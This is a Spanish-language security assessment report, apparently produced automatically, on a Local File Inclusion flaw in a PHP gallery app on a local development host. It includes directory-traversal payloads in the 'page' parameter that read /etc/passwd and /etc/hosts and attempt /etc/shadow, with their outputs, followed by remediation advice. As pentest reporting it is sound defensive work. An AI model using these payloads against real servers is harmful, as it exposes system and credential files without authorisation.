# Informe de Análisis de Seguridad - Local File Inclusion (LFI)

**Fecha:** 2026-04-25T11:47:20Z  
**Objetivo:** http://web.dev.local:8081  
**Tipo de análisis:** Local File Inclusion (LFI)  
**Estado:** VULNERABILIDAD ENCONTRADA Y EXPLOTADA

---

## 1. Resumen Ejecutivo

Se ha identificado y explotado exitosamente una vulnerabilidad de tipo **Local File Inclusion (LFI)** en la aplicación web "Galería de Arte Virtual" alojada en `http://web.dev.local:8081`. La vulnerabilidad permite a un atacante leer archivos arbitrarios del sistema de archivos del servidor, lo que compromete la confidencialidad de la información del sistema.

---

## 2. Descripción del Objetivo

La aplicación web es una "Galería de Arte Virtual" que permite navegar entre distintas categorías de arte (moderno, clásico, abstracto). Utiliza PHP como lenguaje de backend y presenta las siguientes rutas principales:

- `http://web.dev.local:8081/` — Página principal (`index.php`)
- `http://web.dev.local:8081/gallery.php?page=<valor>` — Página de galería con parámetro dinámico

---

## 3. Vulnerabilidad Detectada

### 3.1 Local File Inclusion (LFI)

| Campo         | Detalle                                   |
|---------------|-------------------------------------------|
| **Tipo**      | Local File Inclusion (LFI)               |
| **Severidad** | Crítica                                   |
| **CVSS**      | ~7.5 (High)                              |
| **URL**       | `http://web.dev.local:8081/gallery.php`  |
| **Parámetro** | `page`                                    |
| **Método**    | GET                                       |

### 3.2 Descripción Técnica

El parámetro `page` en `gallery.php` es utilizado directamente en una función PHP `include()` sin sanitización ni validación adecuada. Esto permite a un atacante utilizar secuencias de traversal de directorio (`../`) para acceder a archivos fuera del directorio raíz de la aplicación web.

El error revelado al intentar acceder a `/etc/shadow` expone la ruta absoluta del fichero vulnerable:

```
include(/etc/shadow): Failed to open stream: Permission denied in /var/www/html/gallery.php on line 104
```

Esto confirma que la aplicación usa `include()` directamente con la entrada del usuario.

---

## 4. Explotación

### 4.1 Prueba de Concepto - Lectura de `/etc/passwd`

**Payload utilizado:**
```
http://web.dev.local:8081/gallery.php?page=../../../etc/passwd
```

**Resultado:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

### 4.2 Prueba de Concepto - Lectura de `/etc/hosts`

**Payload utilizado:**
```
http://web.dev.local:8081/gallery.php?page=../../../etc/hosts
```

**Resultado:**
```
127.0.0.1    localhost
::1          localhost ip6-localhost ip6-loopback
fe00::       ip6-localnet
ff00::       ip6-mcastprefix
ff02::1      ip6-allnodes
ff02::2      ip6-allrouters
172.19.0.2   d5054e367753
```

### 4.3 Intento de Lectura de `/etc/shadow`

**Payload utilizado:**
```
http://web.dev.local:8081/gallery.php?page=../../../etc/shadow
```

**Resultado:** Acceso denegado por permisos del sistema operativo (`Permission denied`). El proceso web corre como `www-data`, que no tiene permisos de lectura sobre `/etc/shadow`. Esto limita el impacto directo pero confirma la vulnerabilidad.

---

## 5. Impacto

- **Divulgación de información del sistema:** Lectura del fichero `/etc/passwd` con información de todos los usuarios del sistema.
- **Reconocimiento de la red interna:** Lectura de `/etc/hosts` revela la dirección IP interna del contenedor (`172.19.0.2`).
- **Exposición de la ruta del código fuente:** Los mensajes de error PHP revelan la ruta absoluta (`/var/www/html/gallery.php`).
- **Potencial escalada:** Con acceso a archivos de configuración de la aplicación, un atacante podría obtener credenciales de base de datos u otros secretos.

---

## 6. Recomendaciones

1. **Validar y sanitizar la entrada:** Implementar una lista blanca de valores permitidos para el parámetro `page` (ej.: `['modern', 'classic', 'abstract', 'about']`).
2. **Eliminar el uso directo de `include()` con entrada de usuario:** Usar un mapeo interno de nombres de página a ficheros concretos.
3. **Deshabilitar los mensajes de error en producción:** Configurar `display_errors = Off` en `php.ini` para no revelar rutas internas.
4. **Aplicar el principio de mínimo privilegio:** Asegurarse de que el proceso web solo tiene acceso a los directorios estrictamente necesarios.
5. **Implementar chroot o restricciones de `open_basedir`:** Usar `open_basedir` en PHP para restringir el acceso al sistema de ficheros.

---

## 7. Clasificación

| Métrica          | Valor                   |
|------------------|-------------------------|
| **Vulnerabilidad** | Local File Inclusion (LFI) |
| **CWE**          | CWE-98: Improper Control of Filename for Include/Require Statement |
| **OWASP**        | A03:2021 – Injection    |
| **Severidad**    | Alta/Crítica             |
| **Explotabilidad** | Alta (sin autenticación) |
| **Impacto**      | Alto (lectura de ficheros del sistema) |

---

*Informe generado automáticamente como parte de un análisis de seguridad autorizado.*
